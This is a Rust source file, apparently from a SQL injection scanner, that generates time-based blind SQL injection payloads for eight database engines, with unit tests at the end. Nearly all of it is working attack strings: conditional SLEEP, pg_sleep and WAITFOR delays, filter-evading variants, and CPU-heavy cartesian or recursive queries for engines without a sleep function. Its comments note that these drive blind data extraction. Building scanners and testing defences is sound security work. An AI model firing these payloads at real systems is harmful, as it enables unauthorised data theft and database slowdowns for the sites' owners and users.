//! Time-based blind SQL injection generators.
//!
//! Beyond an unconditional `SLEEP(5)`, these carry the advanced forms:
//!  * **Conditional** delays (`IF`/`CASE WHEN`) so the delay only fires when a
//!    predicate holds — the primitive that drives blind data extraction.
//!  * **Inline** delays that need no stacked-query support (`AND SLEEP`,
//!    `RLIKE SLEEP`, `pg_sleep` in a subselect).
//!  * **Heavy-query** fallbacks for engines with no sleep primitive, or when
//!    `SLEEP`/`WAITFOR` is filtered (cartesian counts, recursive CTEs,
//!    `RANDOMBLOB`).
//!
//! `DELAY_SECS` is the nominal delay; `run_payloads` treats a latency spike
//! over its timing threshold as confirmation.

use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

/// Nominal delay (seconds) baked into the timing payloads below.
pub const DELAY_SECS: u32 = 5;

fn probe(name: &str, payload: &str, dbms: DbmsFamily, clause: SqlClause) -> GeneratedPayload {
    GeneratedPayload {
        name: name.to_string(),
        probe_type: ProbeType::TimingProbe,
        payload_str: payload.to_string(),
        expected_dbms: Some(dbms),
        clause: Some(clause),
    }
}

pub fn generate() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    use SqlClause::{CaseWhen, Select, Subquery};
    vec![
        // --- MySQL / MariaDB -------------------------------------------------
        // Inline conditional delay — no stacking required.
        probe("time-mysql-if-sleep", "' AND IF(1=1,SLEEP(5),0)-- -", MySQL, CaseWhen),
        // Subselect form survives contexts where a bare AND is stripped.
        probe("time-mysql-subselect", "' AND (SELECT 1 FROM(SELECT SLEEP(5))x)-- -", MySQL, Subquery),
        // RLIKE-driven delay (evades naive `AND SLEEP` filters).
        probe("time-mysql-rlike", "' RLIKE SLEEP(5)-- -", MySQL, Select),
        // Heavy CPU fallback when SLEEP() is disabled/filtered.
        probe(
            "time-mysql-benchmark",
            "' AND (SELECT 5 FROM(SELECT BENCHMARK(5000000,MD5(0x41)))x)-- -",
            MySQL,
            Subquery,
        ),
        // MariaDB shares SLEEP() but is fingerprinted separately.
        probe("time-mariadb-sleep", "' AND SLEEP(5)-- -", MariaDB, Select),
        // --- PostgreSQL ------------------------------------------------------
        probe("time-pg-subselect", "' AND 5=(SELECT 5 FROM pg_sleep(5))-- -", PostgreSQL, Subquery),
        probe(
            "time-pg-case",
            "' AND (CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL-- -",
            PostgreSQL,
            CaseWhen,
        ),
        // Heavy fallback (no sleep privilege needed).
        probe(
            "time-pg-generate-series",
            "' AND 5=(SELECT count(*) FROM generate_series(1,20000000))-- -",
            PostgreSQL,
            Subquery,
        ),
        // --- MSSQL -----------------------------------------------------------
        probe("time-mssql-waitfor", "' IF(1=1) WAITFOR DELAY '0:0:5'-- -", MSSQL, CaseWhen),
        probe("time-mssql-stacked", "';WAITFOR DELAY '0:0:5'-- -", MSSQL, Select),
        // Heavy cartesian fallback.
        probe(
            "time-mssql-heavy",
            "' AND 5=(SELECT count(*) FROM sysusers a,sysusers b,sysusers c,sysusers d)-- -",
            MSSQL,
            Subquery,
        ),
        // --- Oracle ----------------------------------------------------------
        // DBMS_PIPE.RECEIVE_MESSAGE blocks for N seconds with no special privs.
        probe(
            "time-oracle-dbms-pipe",
            "' AND 5=(SELECT 5 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)>=0)-- -",
            Oracle,
            Subquery,
        ),
        // Heavy cartesian over all_users.
        probe(
            "time-oracle-heavy",
            "' AND 5=(SELECT count(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- -",
            Oracle,
            Subquery,
        ),
        // --- SQLite ----------------------------------------------------------
        // No sleep primitive: force a large RANDOMBLOB hash (heavy CPU).
        probe(
            "time-sqlite-randomblob",
            "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))-- -",
            SQLite,
            Select,
        ),
        // Recursive-CTE counter fallback.
        probe(
            "time-sqlite-recursive",
            "' AND 5=(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<15000000) SELECT count(*) FROM c)-- -",
            SQLite,
            Subquery,
        ),
        // --- DB2 / H2 --------------------------------------------------------
        probe(
            "time-db2-heavy",
            "' AND 5=(SELECT count(*) FROM sysibm.systables a,sysibm.systables b)-- -",
            DB2,
            Subquery,
        ),
        probe(
            "time-h2-heavy",
            "' AND 5=(SELECT count(*) FROM SYSTEM_RANGE(1,20000000))-- -",
            H2,
            Subquery,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn covers_every_dbms_family() {
        let payloads = generate();
        for fam in DbmsFamily::ALL {
            assert!(
                payloads.iter().any(|p| p.expected_dbms == Some(*fam)),
                "no timing payload for {fam:?}"
            );
        }
    }

    #[test]
    fn includes_conditional_and_heavy_forms() {
        let payloads = generate();
        assert!(
            payloads.iter().any(|p| p.payload_str.contains("CASE WHEN") || p.payload_str.contains("IF(")),
            "expected a conditional delay"
        );
        assert!(
            payloads.iter().any(|p| p.payload_str.contains("count(*)") || p.payload_str.contains("BENCHMARK")),
            "expected a heavy-query fallback"
        );
    }

    #[test]
    fn all_are_timing_probes() {
        assert!(generate().iter().all(|p| p.probe_type == ProbeType::TimingProbe));
    }
}

